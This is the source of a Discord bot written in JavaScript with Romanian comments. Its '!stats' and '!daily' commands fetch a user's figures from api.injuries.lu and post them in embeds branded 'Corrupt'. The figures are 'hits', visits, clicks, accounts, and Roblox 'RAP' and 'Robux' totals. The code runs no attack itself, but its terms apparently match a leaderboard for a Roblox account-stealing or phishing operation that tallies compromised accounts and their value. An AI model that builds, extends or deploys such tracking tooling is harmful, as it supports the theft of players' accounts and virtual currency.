// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Eveniment ready
client.once('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
  console.log(`📊 Serving ${client.guilds.cache.size} servers`);
});

// 5️⃣ Funcție utilă
function formatNumber(num) {
  try { 
    return num.toLocaleString(); 
  } catch { 
    return "0"; 
  }
}

// 6️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  console.log(`📨 Message received: "${message.content}" from ${message.author.username}`);

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    const targetUser = message.mentions.users.first() || message.author;
    const targetId = targetUser.id;

    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();

      if (!data.success || !data.Normal) {
        message.reply("❌ No stats found for this user.");
        return;
      }

      const normal = data.Normal;
      const profile = data.Profile || {};

      const hits = normal.Totals?.Visits || 0;
      const visits = normal.Totals?.Visits || 0;
      const clicks = normal.Totals?.Clicks || 0;
      const accounts = normal.Totals?.Accounts || 0;

      const biggestSummary = normal.Highest?.Summary || 0;
      const biggestRap = normal.Highest?.Rap || 0;
      const biggestRobux = normal.Highest?.Balance || 0;

      const totalSummary = normal.Totals?.Summary || 0;
      const totalRap = normal.Totals?.Rap || 0;
      const totalRobux = normal.Totals?.Balance || 0;

      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setTitle("─── 𝕹𝖔𝖗𝖒𝖆𝖑 𝖎𝖓𝖋𝖔 ───")
        .setAuthor({ name: `Stats for ${userName}`, iconURL: targetUser.displayAvatarURL() })
        .setDescription(`<:emoji:1433659663160971414> **User:** ${userName}

<:emoji:1433659663160971414> **ᴛᴏᴛᴀʟ ꜱᴛᴀᴛꜱ:**
  ʜɪᴛꜱ:     ${formatNumber(hits)}
  ᴠɪꜱɪᴛꜱ:   ${formatNumber(visits)}
  ᴄʟɪᴄᴋꜱ:   ${formatNumber(clicks)}

<:emoji:1433659663160971414> **ʙɪɢɢᴇꜱᴛ ʜɪᴛꜱ:**
  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(biggestSummary)}
  ʀᴀᴘ:      ${formatNumber(biggestRap)}
  ʀᴏʙᴜx:    ${formatNumber(biggestRobux)}

<:emoji:1433659663160971414> **ᴛᴏᴛᴀʟ ʜɪᴛ ꜱᴛᴀᴛꜱ:**
  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(totalSummary)}
  ʀᴀᴘ:      ${formatNumber(totalRap)}
  ʀᴏʙᴜx:    ${formatNumber(totalRobux)}

<a:anim:1433659816466714624> **Corrupt**`)
        .setImage("https://images.steamusercontent.com/ugc/870748399458647939/4E5B352B8FB2C9E9EF63248B8D591288B48F72AB/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false")
        .setFooter({ text: "Corrupt" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error('Error fetching stats:', err);
      message.reply("❌ Error fetching stats. Please try again later.");
    }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    const targetUser = message.mentions.users.first() || message.author;
    const targetId = targetUser.id;

    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();

      if (!data.success) {
        message.reply("❌ No stats found for this user.");
        return;
      }

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};

      if (!daily) {
        message.reply("❌ No daily stats available for this user.");
        return;
      }

      const dailyHits = daily.Totals?.Visits || 0;
      const dailyVisits = daily.Totals?.Visits || 0;
      const dailyClicks = daily.Totals?.Clicks || 0;
      const dailySummary = daily.Totals?.Summary || 0;
      const dailyRap = daily.Totals?.Rap || 0;
      const dailyRobux = daily.Totals?.Balance || 0;

      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setTitle("─── 𝕹𝖔𝖗𝖒𝖆𝖑 𝖎𝖓𝖋𝖔 ───")
        .setAuthor({ name: `Daily Stats for ${userName}`, iconURL: targetUser.displayAvatarURL() })
        .setDescription(`<:emoji:1433659663160971414> **User:** ${userName}

<:emoji:1433659663160971414> **ᴅᴀɪʟʏ ꜱᴛᴀᴛꜱ:**
  ʜɪᴛꜱ:     ${formatNumber(dailyHits)}
  ᴠɪꜱɪᴛꜱ:   ${formatNumber(dailyVisits)}
  ʟɪᴄᴋꜱ:   ${formatNumber(dailyClicks)}

<:emoji:1433659663160971414> **ᴅᴀɪʟʏ ʜɪᴛ ꜱᴛᴀᴛꜱ:**
  ꜱᴜᴍᴍᴀʀʏ:  ${formatNumber(dailySummary)}
  ʀᴀᴘ:      ${formatNumber(dailyRap)}
  ʀᴏʙᴜx:    ${formatNumber(dailyRobux)}

<a:anim:1433659816466714624> **Corrupt**`)
        .setImage("https://images.steamusercontent.com/ugc/870748399458647939/4E5B352B8FB2C9E9EF63248B8D591288B48F72AB/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false")
        .setFooter({ text: "Corrupt Daily" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error('Error fetching daily stats:', err);
      message.reply("❌ Error fetching daily stats. Please try again later.");
    }
  }
});

// 7️⃣ Error handler
client.on('error', (error) => {
  console.error('Discord client error:', error);
});

// 8️⃣ Verificare token
if (!TOKEN) {
  console.error('❌ DISCORD_BOT_TOKEN is not set in environment variables!');
  process.exit(1);
}

// 9️⃣ Login bot
client.login(TOKEN);
